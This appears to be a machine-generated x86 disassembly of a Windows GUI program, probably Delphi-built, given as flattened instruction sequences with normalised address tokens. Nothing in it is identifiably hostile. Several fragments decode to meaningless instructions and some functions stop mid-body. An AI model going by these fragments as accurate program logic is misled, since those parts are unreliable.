mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
sub_44a3e0
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44a5b9
jmp sub_403878
sub_44a5c0
pop ebx
pop ecx
pop ebp
retn
sub_44a5c4
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44a5cc
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44a834
sub_44a679
jmp sub_403878
sub_44a680
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403124
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44a788
test edx edx
je r-xdata
mov eax [ eax + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
retn
mov eax edx
retn
sub_44a8c7
jmp sub_403878
sub_44a8ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44a966
jmp sub_403878
sub_44a96d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a98a
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_44a983
jmp sub_403878
sub_44a98a
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403320
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44aa61
jmp sub_403878
sub_44aa9f
jmp sub_403878
sub_44aaa6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403320
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ac6b
jmp sub_403878
sub_44ac72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ac8f
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_44ac88
jmp sub_403878
sub_44ac8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44ad08
retn
sub_44aca8
jmp sub_403878
sub_44acf7
jmp sub_403878
sub_44acfe
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44ad87
jmp sub_403878
sub_44ad8e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ad94
or edx 0xffffffff
call sub_44ad08
retn
sub_44b1a3
jmp sub_403878
sub_44b1aa
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1c7
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_44b1c0
jmp sub_403878
sub_44b1c7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b1e4
mov eax [ ebp - 0x4 ]
call sub_44bcdc
retn
sub_44b1dd
jmp sub_403878
sub_44b1e4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b3e8
jmp sub_403878
sub_44b3ef
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b3f4
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403320
sub_44b40c
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_412cac
pop ebx
retn
sub_44b4b0
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_413fac
sub_44b5c7
jmp sub_403878
sub_44b5ce
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403124
retn
sub_44b5e4
jmp sub_403878
sub_44b8f6
jmp sub_403878
sub_44b8fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b91a
mov eax [ ebp - 0x10 ]
call sub_403124
retn
sub_44b913
jmp sub_403878
sub_44b91a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b937
mov eax [ ebp - 0x8 ]
call sub_403124
retn
sub_44b930
jmp sub_403878
sub_44b937
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b9a0
jmp sub_403878
sub_44bab9
jmp sub_403878
sub_44bad6
jmp sub_403878
sub_44bc8e
jmp sub_403878
sub_44bc95
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44bcd8
inc [ eax + 0x5c ]
retn
sub_44bcdc
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403320
sub_44bd30
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44bd6d
jmp sub_403878
sub_44bd74
pop ebp
retn
sub_44bd78
sub [ rw-data ] 0x1
retn
sub_44c1c4
clc
push edx
push ecx
jmp [ esp + edi * 8 - 0x95bffbc ]
sub_44cc83
jmp [ eax + eax ]
sub_44cce0
mov eax [ esp + 0x8 ]
retn
sub_44cce8
push ebx
mov ebx eax
call sub_44cce0
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
jmp sub_4038b0
sub_44cd04
pop ebx
retn
sub_44cf7d
jmp sub_403878
sub_44cf84
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44d0cf
jmp sub_403878
sub_44d0d6
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d0ec
push ebx
mov eax [ rw-data ]
call sub_414678
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_414634
mov eax ebx
pop ebx
retn
sub_44d274
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44d290
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44d98b
jmp sub_403878
sub_44d992
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44da8a
jmp sub_403878
sub_44da91
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44deb4
jmp sub_403878
sub_44debb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44e367
jmp sub_403878
sub_44e808
jmp sub_403878
sub_44e80f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ec73
jmp sub_403878
sub_44f130
jmp sub_403878
sub_44f137
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f4e2
jmp sub_403878
sub_44f4e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_44f4f7
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44f6a4
mov eax [ r-xdata ]
retn
sub_44f6e0
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44f6f4
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44f704
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44f714
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_44fa10
mov edx eax
sub_44f7ac
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d4
mov edx esi
call sub_44f72c
pop esi
pop ebx
retn
sub_44f828
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_44fa10
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_414164
mov ecx eax
sub_44fc00
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_44fc68
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_450010
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_450044
sub_450044
mov edx sub_45001c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44d16c
retn
sub_45022e
jmp sub_403878
sub_450235
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4506cc
jmp sub_403878
sub_45070b
jmp sub_403878
sub_450712
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4508b0
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4509a0
sti
jmp [ edi + ecx * 4 + 0x5 ]
sub_4509ec
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403320
pop esi
pop ebp
retn 0x8
sub_450a08
mov eax [ eax + 0x34 ]
call sub_44dc40
retn
sub_450a14
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403320
pop esi
retn
sub_450a50
push ebx
mov ecx sub_450a28
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44d16c
pop ebx
retn
sub_450c84
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_450c98
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_450dcd
jmp sub_4035c4
sub_450ecf
jmp sub_403878
sub_450efa
jmp sub_403878
sub_450f01
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_450f18
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_451100
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_450a50
sub_451180
jmp sub_403878
sub_4511c4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4511dc
push ebx
mov ebx eax
mov eax ebx
call sub_41aecc
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_45122e
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_450a50
sub_4512a4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4513ed
jmp sub_403878
sub_4513f4
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451634
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_451644
sub_451698
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4516a8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4516b8
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4516c8
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4516d8
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_451750
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44da98
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44da98
retn
sub_45176c
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44da98
sub_4517b4
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_450a08
retn
mov eax edx
retn
sub_4517ee
jmp sub_4035c4
sub_4517f3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451b59
jmp sub_403878
sub_451b60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403124
retn
sub_451b76
jmp sub_403878
sub_451c77
jmp sub_403878
sub_451c7e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451c9b
mov eax [ ebp - 0x14 ]
call sub_403124
retn
sub_451c94
jmp sub_403878
sub_451cb9
jmp sub_403878
sub_451d43
jmp sub_403878
sub_451d4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451d7c
push ebx
mov ebx eax
mov eax ebx
call sub_4142a4
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41bc7c
sub_451e40
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_451e54
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_451e5c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_452221
jmp sub_403878
sub_452228
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452328
jmp sub_403878
sub_45232f
pop ebp
retn
sub_452ea7
[ edi + edi * 8 - 0x2f002f ]
sub_452eae
stc
jmp esp
sub_4534f3
xchg esp eax
hlt
sub_454170
mov eax [ rw-data ]
retn
sub_454178
mov [ rw-data ] eax
retn
sub_4542c0
jmp sub_4035c4
sub_4542f7
jmp sub_403878
sub_4542fe
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454606
jmp sub_403878
sub_45460d
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4546b1
jmp sub_403878
sub_4546b8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454748
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_454e74
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_455520
sub_454e90
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_454e74
sub_454fb0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_455520
sub_454fc8
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_455520
sub_454fe0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_455520
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_45500c
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_455018
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_455520
retn
sub_4552f8
push ebx
mov ebx edx
mov edx ebx
call sub_440aec
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_455368
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_455490
jmp sub_403878
sub_455497
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4554a0
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_4548ac
mov eax [ ebx + 0x20c ]
call sub_4548ac
sub_455500
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_455510
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45560b
jmp sub_403878
sub_455618
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_455630
sub_45584c
retn
sub_4558ba
jmp sub_403878
sub_4558f9
jmp sub_403878
sub_45592c
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_441fe4
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_454b38
retn
sub_455950
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_442004
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_454b38
retn
sub_455a45
jmp sub_403878
sub_455a4c
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4547a0
mov eax [ ebp - 0x4 ]
call sub_455520
sub_455b80
jmp sub_403878
sub_455bb8
jmp sub_403878
sub_455bbf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455bdf
lea eax [ ebp - 0x114 ]
call sub_403ef8
retn
sub_455bd8
jmp sub_403878
sub_455bdf
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_455ee6
jmp sub_403878
sub_455eed
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403498
j_sub_4035c4#9
jmp sub_4035c4
j_sub_4035c4#8
jmp sub_4035c4
sub_455fc2
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45d3bc
call sub_40392c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45637a
jmp sub_403878
sub_456381
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45645c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4188d0
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_456474
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4564ac
mov edx eax
mov eax esi
call sub_41a158
pop esi
pop ebx
retn
sub_456490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457850
mov edx eax
mov eax esi
call sub_41a158
pop esi
pop ebx
retn
sub_4564ac
push ebx
mov ebx eax
mov eax ebx
call sub_4574f0
mov edx r-xdata
call sub_41ec10
pop ebx
retn
sub_4565b0
push ebx
mov ebx eax
mov eax ebx
call sub_4565c0
xor al 0x1
pop ebx
retn
sub_4565c0
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_45661c
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45663c
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_45665c
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_456955
jmp sub_403878
sub_45695c
pop ecx
pop ebp
retn
sub_456960
xor eax eax
retn
sub_456c38
jmp sub_403878
sub_456c3f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_456c55
jmp sub_403878
sub_456d3f
jmp sub_403878
sub_456d46
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456d63
mov eax [ ebp - 0xc ]
call sub_403124
retn
sub_456d5c
jmp sub_403878
sub_456d83
jmp sub_403878
sub_45706e
jmp sub_403878
sub_457201
jmp sub_403878
sub_4574f0
mov eax [ eax + 0x238 ]
retn
sub_4574f8
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_457504
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_457842
jmp sub_403878
sub_457849
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457850
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_457898
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_441200
sub_4578b4
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4578f0
push ebx
mov ebx eax
mov eax ebx
call sub_443194
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41e64c
sub_457974
push ebx
mov ebx eax
mov eax ebx
call sub_4431bc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41ecb4
sub_457994
push ebx
mov ebx eax
mov eax ebx
call sub_4575b4
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_45767c
pop ebx
retn
sub_4581c1
lea eax [ ebp - 0xb4 ]
call sub_403ef8
retn
sub_4581cd
jmp sub_403878
j_sub_4581c1
jmp sub_4581c1
sub_4581d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45832c
jmp sub_403878
sub_458333
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458618
jmp sub_403878
sub_45861f
mov eax [ rw-data ]
call sub_45aed0
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458636
add [ eax ] al
retn
sub_458894
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_4588b4
mov eax [ eax + 0x240 ]
call sub_424990
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45cc70
sub_45895b
jmp sub_403878
sub_458962
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458985
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41ec8c
retn
sub_45897e
jmp sub_403878
sub_458985
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4588b4
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_458dac
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_450bbc
sub_458e97
jmp sub_403878
sub_458e9e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458ea4
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_45868c
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_458efc
call sub_459c24
retn
sub_459349
jmp sub_403878
sub_459350
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45964c
jmp sub_4035c4
j_sub_4035c4#7
jmp sub_4035c4
sub_459ae1
jmp sub_403878
sub_459ae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459b05
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_459afe
jmp sub_403878
sub_459b05
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459b0c
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_424990
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_456554
sub_459b2c
call sub_403124
retn
sub_459b84
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_459bea
jmp sub_403878
sub_459d98
jmp sub_4035c4
sub_459dc4
xor edx edx
call sub_4568b8
retn
sub_459dcc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_4568b8
mov eax ebx
call sub_43d6e4
pop ebx
retn
sub_459e52
jmp sub_403878
sub_459e59
pop ebx
pop ecx
pop ebp
retn
sub_459e60
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_443c60
push eax
call PostMessageA
pop ebx
retn
sub_45a064
jmp sub_403878
sub_45a105
jmp sub_403878
sub_45a10f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a12e
mov eax [ rw-data ]
call sub_45c348
retn
sub_45a127
jmp sub_403878
sub_45a12e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a14b
lea eax [ ebp - 0x20 ]
call sub_403ef8
retn
sub_45a144
jmp sub_403878
sub_45a14b
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a22c
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43c890
retn
mov edx eax
mov eax [ rw-data ]
call sub_45b99c
retn
sub_45a5b0
mov edx eax
mov eax [ rw-data ]
call sub_45d3bc
mov al 0x1
retn
sub_45a698
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45a5c0
sub_45a6ac
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45a5c0
sub_45a6c0
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45a5c0
sub_45a6d4
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45a5c0
sub_45a6e8
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45a853
jmp sub_403878
sub_45a85a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a860
push ebx
mov ebx eax
mov eax ebx
call sub_442578
mov eax ebx
call sub_4426fc
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_459e60
sub_45aad6
jmp sub_403878
sub_45aadd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45aae4
push ebx
mov ebx edx
mov edx ebx
call sub_4429e0
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43c998
pop ebx
retn
sub_45ab38
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45aba0
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45ab50
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45aba0
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45ab6c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45aba0
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45ab84
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45aba0
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45ae20
